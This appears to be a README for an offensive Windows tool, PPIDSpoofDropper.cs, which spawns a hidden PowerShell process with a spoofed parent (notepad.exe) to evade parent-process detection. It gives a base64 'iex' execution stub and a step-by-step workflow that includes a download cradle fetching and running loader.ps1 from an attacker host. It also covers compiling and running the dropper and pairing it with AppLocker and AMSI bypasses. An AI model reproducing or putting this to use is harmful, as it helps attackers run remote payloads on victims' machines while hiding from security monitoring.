# ppid-spoof

One file: `PPIDSpoofDropper.cs`. **Standalone.**

---

## PPIDSpoofDropper.cs

Spawns a hidden PowerShell process that **appears in Process Explorer as a child of `notepad.exe`** instead of as a child of your dropper. Defeats parent-process-chain detection (e.g. "why is Word spawning PowerShell?").

**How PPID spoofing works:**
Windows lets you specify an arbitrary parent when creating a new process via `PROC_THREAD_ATTRIBUTE_PARENT_PROCESS` in the extended startup attributes. The process is still really yours — but Task Manager and security tools see the fake parent PID.

Also sets `BLOCK_NON_MICROSOFT_BINARIES` on the child process to prevent DLL injection into it.

---

## What the spawned PowerShell runs

```powershell
[System.Text.Encoding]::ASCII.GetString(
  [System.Convert]::FromBase64String('<base64_here>')) | iex
```

Where `<base64_here>` is either:
- The hardcoded base64 string in `Main()` (default)
- A base64-encoded PS command passed as a command-line argument

---

## Workflow

```bash
# 1. Prepare your PowerShell payload (e.g. a download cradle)
$cmd = "IEX(New-Object Net.WebClient).DownloadString('http://<KALI_IP>/loader.ps1')"
$b64 = [Convert]::ToBase64String([Text.Encoding]::ASCII.GetBytes($cmd))
# Copy the base64 string

# 2. Edit PPIDSpoofDropper.cs — paste your base64 into Main()
#    OR leave as-is and pass it as an argument at runtime

# 3. Compile — Visual Studio (Windows dev box)
#
#    File → New → Project → Console App (.NET Framework)
#    Name: "dropper", Framework: .NET Framework 4.8
#    Paste PPIDSpoofDropper.cs contents, replace defaults
#    Project → Properties → Build:
#      Platform target: x64
#      ☑ Allow unsafe code
#    Build → Build Solution (Ctrl+Shift+B)
#    Output: bin\x64\Debug\dropper.exe
#
#    Alt (Windows cmd): csc.exe /unsafe /platform:x64 /out:dropper.exe PPIDSpoofDropper.cs

# 4. Run (uses hardcoded base64)
.\dropper.exe

# 4b. Run with argument (overrides the hardcoded base64)
.\dropper.exe <base64_command>
```

---

## Notes

- Default fake parent: `notepad.exe`. If notepad isn't running, the dropper launches it first.
- The dropper itself has no AppLocker bypass — if AppLocker blocks it, wrap it in InstallUtil (see `01-evasion/applocker-bypass/`).
- The spawned PowerShell inherits the fake parent PID, not any evasion of PS itself. Combine with an AMSI bypass PS script if PowerShell scanning is an issue.
